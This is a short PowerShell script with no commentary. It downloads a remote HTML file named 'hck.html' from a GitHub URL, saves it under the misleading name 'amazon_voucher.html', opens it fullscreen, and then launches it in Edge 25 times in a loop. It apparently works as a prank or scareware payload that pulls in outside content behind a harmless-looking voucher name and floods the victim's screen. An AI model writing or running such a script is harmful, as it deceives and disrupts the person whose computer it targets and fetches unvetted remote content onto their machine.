powershell -Command "invoke-webrequest 'https://raw.githubusercontent.com/vishwks22/cyscript/refs/heads/main/hck.html' -Outfile '.\Downloads\amazon_voucher.html'"
Start-Process "$([Environment]::GetFolderPath('UserProfile'))\Downloads\amazon_voucher.html" --start-fullscreen
sleep 5
$urls = @("$([Environment]::GetFolderPath('UserProfile'))\Downloads\amazon_voucher.html")
#$urls = @("https://bing.com", "https://google.com", "https://stackoverflow.com")
$i = 1
while ($i -le 25) {
    Start-Process "msedge.exe" -ArgumentList $urls
    $i++
}
